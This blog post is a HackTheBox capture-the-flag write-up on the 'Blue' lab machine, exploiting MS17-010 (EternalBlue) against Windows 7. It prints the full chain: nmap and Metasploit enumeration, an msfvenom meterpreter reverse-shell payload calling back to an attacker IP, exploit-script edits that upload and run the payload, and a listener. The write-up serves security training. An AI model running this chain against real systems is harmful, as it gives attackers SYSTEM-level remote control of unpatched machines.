<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8"/>
    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
    <meta name="description" content="Personal Weblog"/>
    <meta content="width=device-width, initial-scale=1" name="viewport"/>
    <title>मंथन | Manthan</title>
    <link rel="icon" type="image/webp" sizes="32x32" href="/static/images/manthan-32x32.png.webp"/>
    <link rel="stylesheet" type="text/css" media="screen" href="/static/css/style.css"/>
    <link rel="stylesheet" href="/static/css/atelier-forest-light.css">
    <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
    <!-- <link rel="stylesheet" href="/static/css/github-gist.min.css"> -->
    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
    <script charset="UTF-8" src="/static/js/highlight.min.js"></script>
    <script charset="UTF-8" src="/static/js/highlightjs-line-numbers.min.js"></script>
    <script charset="UTF-8" src="/static/js/go.min.js"></script>
   </head>
  <body>
    <div class="body">
      <div class="topmenu">
        <table>
          <tr>
            <td colspan="3"><a class="menu_home" href="/index.html">मंथन</a></td>
          </tr>
          <tr>
            <td><a class="menu_archive" href="/archive.html">💾 Archive</a></td>
            <td><a class="menu_tags" href="/tags.html">🔖 Tags</a></td>
            <td><a class="menu_stats" href="/stats.html">📊 Stats</a></td>
          </tr>
        </table>
      </div>
      <div class="content">
          <hr>
  <h1 class="h1 title collapsible" onclick="toggle(this);">[HackTheBox] Blue</h1>
    <div class="title"><code><span class="sparklines"><span style="color:#a50b5e;">▃</span><span style="color:#69359c;">▁</span><span style="color:#007bff;">▇</span><span style="color:#6610f2;">▁</span><span style="color:#00b7eb;">▄</span><span style="color:#99cc99;">▆</span><span style="color:#007bff;">█</span><span style="color:#00bcd4;">▃</span><span style="color:#99cc99;">▂</span><span style="color:#28a745;">▅</span><span style="color:#fe4164;">█</span><span style="color:#007bff;">▄</span><span style="color:#28a745;">▄</span><span style="color:#2196f3;">▇</span><span style="color:#20c997;">▇</span><span style="color:#6c757d;">▇</span><span style="color:#20c997;">▄</span><span style="color:#4caf50;">▅</span><span style="color:#6610f2;">▁</span><span style="color:#ffc107;">▆</span><span style="color:#dc3545;">▆</span><span style="color:#ffc107;">▇</span><span style="color:#e83e8c;">▇</span><span style="color:#6f42c1;">▇</span><span style="color:#dc3545;">▄</span><span style="color:#f44336;">▅</span><span style="color:#99cc99;">▄</span><span style="color:#00b7eb;">▇</span><span style="color:#ffcc66;">▁</span><span style="color:#99cc99;">▃</span><span style="color:#99cc99;">▁</span><span style="color:#ffcc66;">▃</span><span style="color:#99cc99;">▆</span><span style="color:#8357ff;">▄</span><span style="color:#fd7e14;">█</span><span style="color:#5b92e5;">▃</span><span style="color:#17a2b8;">▆</span><span style="color:#ffc107;">▄</span><span style="color:#e83e8c;">█</span><span style="color:#6c757d;">▄</span><span style="color:#99cc99;">▁</span><span style="color:#ffc107;">▇</span><span style="color:#20c997;">▆</span><span style="color:#0c9;">▂</span><span style="color:#a50b5e;">▁</span><span style="color:#20c997;">▇</span><span style="color:#f44336;">▆</span><span style="color:#fd7e14;">█</span><span style="color:#dc3545;">▇</span><span style="color:#99cc99;">▅</span><span style="color:#ffc107;">▇</span><span style="color:#fd7e14;">▇</span><span style="color:#e83e8c;">▁</span><span style="color:#f44336;">▅</span><span style="color:#fe4164;">▁</span><span style="color:#ffc107;">▄</span><span style="color:#dc3545;">▂</span><span style="color:#f44336;">▇</span><span style="color:#0c9;">▅</span><span style="color:#fd7e14;">█</span><span style="color:#00bcd4;">█</span><span style="color:#fe4164;">▇</span><span style="color:#69359c;">▂</span><span style="color:#4caf50;">▄</span></span></code></div>
    <hr>
          <p style="float:left;"><a href="/posts/20191029_vulnhub-lazysysadmin1.html"> « </a>📅 published on <code>01/Nov/2019</code><a href="/posts/20191101_htb-lame.html"> » </a></p>
        <p style="float:right;">🔖 tagged <a href=/tags.html#hackthebox>hackthebox</a> and <a href=/tags.html#writeup>writeup</a></p>
    <div style="clear:both;"></div>
    <hr><h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
<p class="nested active">This is a writeup for HTB VM <a href="https://www.hackthebox.eu/home/machines/profile/51">Blue</a>. Here are stats for this machine from <a href="https://github.com/7h3rAm/machinescli">machinescli</a>:</p>
<p class="nested active"><img alt="writeup.overview.machinescli" src="/static/files/posts_htb_blue/machinescli.png.webp" /></p>
<h3 class="h3 collapsible" onclick="toggle(this);">Killchain</h3>
<p class="nested active">Here's the killchain (<code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code>) for this machine:</p>
<p class="nested active"><img alt="writeup.overview.killchain" src="/static/files/posts_htb_blue/killchain.png.webp" /></p>
<h3 class="h3 collapsible" onclick="toggle(this);">TTPs</h3>
<p class="nested active">1. <code>139/tcp/netbios-ssn/Microsoft Windows netbios-ssn</code>: <a href="https://github.com/7h3rAm/writeups#exploit_smb_ms17_010">exploit_smb_ms17_010</a>  </p>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
<p class="nested active">1. Here's the Nmap scan result:  </p>
<pre class="nested active"><code># Nmap 7.70 scan initiated Fri Nov  1 17:05:41 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/htb.blue/results/10.10.10.40/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/htb.blue/results/10.10.10.40/scans/xml/_quick_tcp_nmap.xml 10.10.10.40
Nmap scan report for 10.10.10.40
Host is up, received user-set (0.15s latency).
Scanned at 2019-11-01 17:05:41 PDT for 171s
Not shown: 991 closed ports
Reason: 991 resets
PORT      STATE SERVICE      REASON          VERSION
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  unknown      syn-ack ttl 127
49156/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 57283/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 12383/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 19006/udp): CLEAN (Timeout)
|   Check 4 (port 60472/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   2.10:
|_    Message signing enabled but not required
|_smb2-time: Protocol negotiation failed (SMB2)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  1 17:08:32 2019 -- 1 IP address (1 host up) scanned in 171.43 seconds
</code></pre>

<p class="nested active">2. Here's the summary of open ports and associated <a href="https://github.com/Tib3rius/AutoRecon">AutoRecon</a> scan files:  </p>
<p class="nested active"><img alt="writeup.enumeration.steps.2.1" src="/static/files/posts_htb_blue/openports.png.webp" />  </p>
<p class="nested active">3. We find SMB ports to be open on the target system. We run a Nmap NSE script scan to check if the SMB service is vulnerable:  </p>
<pre class="nested active"><code>nmap -p139,445 --script smb-vuln-* --script-args=unsafe=1 10.10.10.40
</code></pre>

<p class="nested active"><img alt="writeup.enumeration.steps.3.1" src="/static/files/posts_htb_blue/screenshot01.png.webp" />  </p>
<p class="nested active">4. We find that the target system is missing patches from <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010">MS17-010</a> bulletin and as such vulnerable. We can use the <a href="https://github.com/worawit/MS17-010">zzz_exploit.py</a> EternalBlue exploit to gain interactive access. But before that we need to determine the target OS version and the name of an active pipe.  </p>
<p class="nested active">5. We first use Metasploit auxiliary module <code>scanner/smb/smb_version</code> to determine target OS version to be <code>Windows 7 Professional SP1 (build:7601) (name:HARIS-PC)</code>:  </p>
<pre class="nested active"><code>msfconsole
  use auxiliary/scanner/smb/smb_version
  show options
  set RHOSTS 10.10.10.40
  run
</code></pre>

<p class="nested active"><img alt="writeup.enumeration.steps.5.1" src="/static/files/posts_htb_blue/screenshot02.png.webp" />  </p>
<p class="nested active">6. Then we use another Metasploit auxiliary module <code>scanner/smb/pipe_auditor</code> to find multiple open pipes <code>\netlogon, \lsarpc, \samr, \browser, \atsvc, \epmapper, \eventlog, \InitShutdown, \keysvc, \lsass, \LSM_API_service, \ntsvcs, \plugplay, \protected_storage, \scerpc, \srvsvc, \trkwks, \W32TIME_ALT, \wkssvc</code>:  </p>
<pre class="nested active"><code>msfconsole
  use auxiliary/scanner/smb/pipe_auditor
  show options
  set RHOSTS 10.10.10.40
  run
</code></pre>

<p class="nested active"><img alt="writeup.enumeration.steps.6.1" src="/static/files/posts_htb_blue/screenshot03.png.webp" />  </p>
<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
<pre class="nested active"><code>135/tcp    |  msrpc         |  Microsoft Windows RPC
139/tcp    |  netbios-ssn   |  Microsoft Windows netbios-ssn
445/tcp    |  microsoft-ds  |  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp  |  msrpc         |  Microsoft Windows RPC
49153/tcp  |  msrpc         |  Microsoft Windows RPC
49154/tcp  |  msrpc         |  Microsoft Windows RPC
49155/tcp  |  unknown       |
49156/tcp  |  msrpc         |  Microsoft Windows RPC
49157/tcp  |  msrpc         |  Microsoft Windows RPC
</code></pre>

<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
<p class="nested active">1. We now need to create a binary payload file. For this exploit, we will use <code>meterpreter</code> as the payload and then use <code>multi/handler</code> to catch the incoming shell connection. We then slightly tweak the exploit file to first copy the binary payload on to the target system and execute it:  </p>
<pre class="nested active"><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.18 lport=443 -f exe &gt;mtrptr.exe
subl zzz_exploit.py
  def smb_pwn(conn, arch):
    smbConn = conn.get_smbconnection()
    print('creating file c:\\pwned.txt on the target')
    tid2 = smbConn.connectTree('C$')
    fid2 = smbConn.createFile(tid2, '/pwned.txt')
    smbConn.closeFile(tid2, fid2)
    smbConn.disconnectTree(tid2)
    + smb_send_file(smbConn, '/root/toolbox/writeups/htb.blue/mtrptr.exe', 'C', '/mtrptr.exe')
    + service_exec(conn, r'cmd /c c:\\mtrptr.exe')
msfconsole
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set lhost 10.10.14.18
  set lport 443
  set ExitOnSession false
  exploit -j
python zzz_exploit.py 10.10.10.40 netlogon
msfconsole
  sessions -i 1
  getuid
</code></pre>

<p class="nested active"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_htb_blue/screenshot04.png.webp" />  </p>
<p class="nested active"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_htb_blue/screenshot05.png.webp" />  </p>
<p class="nested active"><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_htb_blue/screenshot06.png.webp" />  </p>
<p class="nested active"><img alt="writeup.exploitation.steps.1.4" src="/static/files/posts_htb_blue/screenshot07.png.webp" />  </p>
<p class="nested active"><img alt="writeup.exploitation.steps.1.5" src="/static/files/posts_htb_blue/screenshot08.png.webp" />  </p>
<p class="nested active">2. We then obtain further information about the system and read the contents of both user.txt and root.txt files to comeplete the challenge:  </p>
<pre class="nested active"><code>sysinfo
cat C:\Users\haris\Desktop\user.txt
cat C:\Users\haris\Desktop\root.txt
</code></pre>

<p class="nested active"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_htb_blue/screenshot09.png.webp" />  </p>
<p class="nested active"><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_htb_blue/screenshot10.png.webp" />  </p>
<p class="nested active"><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_htb_blue/screenshot11.png.webp" />  </p>
<hr><h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
<pre class="nested active"><code>ntauth/system@HARIS-PC&gt; id
NT AUTHORITY\SYSTEM
ntauth/system@HARIS-PC&gt;  
ntauth/system@HARIS-PC&gt; uname
Computer        : HARIS-PC
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_GB
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
ntauth/system@HARIS-PC&gt;  
ntauth/system@HARIS-PC&gt; ifconfig
Ethernet adapter Local Area Connection:
  Connection-specific DNS Suffix  . :
  IPv6 Address. . . . . . . . . . . : dead:beef::c530:b184:97a4:fd67
  Temporary IPv6 Address. . . . . . : dead:beef::4d8e:bdfd:4c8b:3189
  Link-local IPv6 Address . . . . . : fe80::c530:b184:97a4:fd67%11
  IPv4 Address. . . . . . . . . . . : 10.10.10.40
  Subnet Mask . . . . . . . . . . . : 255.255.255.0
  Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:db57%11
                                      10.10.10.2
ntauth/system@HARIS-PC&gt;  
ntauth/system@HARIS-PC&gt; users
Administrator
haris
</code></pre>

<hr><h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
<h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
<pre class="nested active"><code>C:\Users\haris\Desktop\user.txt: 4c546aea7dbee75cbd7.............
C:\Users\Administrator\Desktop\root.txt: ff548eb71e920ff6c0..............
</code></pre>

<hr><h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
<ul class="nested active">
<li><a href="https://www.hackthebox.eu/home/machines/profile/51">https://www.hackthebox.eu/home/machines/profile/51</a>  </li>
<li><a href="https://medium.com/@sdgeek/hack-the-box-htb-blue-115b3f563125">https://medium.com/@sdgeek/hack-the-box-htb-blue-115b3f563125</a>  </li>
</ul>
    <hr>
          <p style="float:left;">« <a href="/posts/20191029_vulnhub-lazysysadmin1.html">[VulnHub] LazySysAdmin: 1</a> «</p>
      <p style="float:right;">» <a href="/posts/20191101_htb-lame.html">[HackTheBox] Lame</a> »</p>
          </div>
      <div><a class="footer" href="https://github.com/7h3rAm/7h3rAm.github.io">  </a></div>
      <script>hljs.initHighlightingOnLoad();</script>
      <script>hljs.initLineNumbersOnLoad();</script>
      <script>
        function toggle(s){
          s.classList.toggle("expanded");
          var t=!1,i=!1,a=!1;
          s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0);
          for(var l=s.nextElementSibling;l;){
            if(t&&l.classList.contains("h2")){
              l.classList.toggle("active");
              break
            }
            if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){
              l.classList.toggle("active");
              break
            }
            if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){
              l.classList.toggle("active");
              break
            }
            l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling
          }
        }
      </script>
    </div>
  </body>
</html>